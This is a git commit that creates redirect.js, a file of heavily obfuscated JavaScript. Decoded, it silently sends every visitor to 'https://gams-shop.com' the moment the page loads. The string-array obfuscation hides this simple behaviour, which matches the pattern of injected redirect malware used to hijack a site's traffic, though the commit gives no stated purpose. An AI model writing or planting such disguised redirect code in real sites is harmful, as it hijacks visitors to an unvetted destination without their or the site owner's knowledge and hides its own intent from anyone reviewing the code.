98b8a09f1d1519a5e0d76880b8554f424bb4f58e
546pvp <79662987+546pvp@users.noreply.github.com>
2023-04-25 18:15:54 +0200

    Create redirect.js

---
+++ redirect.js
@@ -0,0 +1,44 @@
+var _0x1186ee = _0x15db;
+(function (_0xc7f1c0, _0x431257) {
+    var _0x1b229e = _0x15db, _0x179564 = _0xc7f1c0();
+    while (!![]) {
+        try {
+            var _0x58d2dd = -parseInt(_0x1b229e(0x16d)) / 0x1 + parseInt(_0x1b229e(0x172)) / 0x2 + parseInt(_0x1b229e(0x170)) / 0x3 * (parseInt(_0x1b229e(0x173)) / 0x4) + -parseInt(_0x1b229e(0x16c)) / 0x5 * (parseInt(_0x1b229e(0x169)) / 0x6) + -parseInt(_0x1b229e(0x174)) / 0x7 * (parseInt(_0x1b229e(0x175)) / 0x8) + -parseInt(_0x1b229e(0x16f)) / 0x9 + -parseInt(_0x1b229e(0x171)) / 0xa * (-parseInt(_0x1b229e(0x16e)) / 0xb);
+            if (_0x58d2dd === _0x431257)
+                break;
+            else
+                _0x179564['push'](_0x179564['shift']());
+        } catch (_0x27a498) {
+            _0x179564['push'](_0x179564['shift']());
+        }
+    }
+}(_0x2993, 0xa00e5), window['location'][_0x1186ee(0x16b)] = _0x1186ee(0x16a));
+function _0x15db(_0x1f4f07, _0xb158e6) {
+    var _0x299318 = _0x2993();
+    return _0x15db = function (_0x15dbe0, _0x550199) {
+        _0x15dbe0 = _0x15dbe0 - 0x169;
+        var _0x305802 = _0x299318[_0x15dbe0];
+        return _0x305802;
+    }, _0x15db(_0x1f4f07, _0xb158e6);
+}
+function _0x2993() {
+    var _0x3b8aa3 = [
+        '20KvHzSW',
+        '1274098bnhNFp',
+        '284612idVswu',
+        '14NGlNqT',
+        '5037904XkVAFL',
+        '1145226ubrKWr',
+        'https://gams-shop.com',
+        'href',
+        '10wxxXQK',
+        '565109kIwwLe',
+        '13806661wqlgRQ',
+        '3209292pTfFPu',
+        '3JXtDaK'
+    ];
+    _0x2993 = function () {
+        return _0x3b8aa3;
+    };
+    return _0x2993();
+}
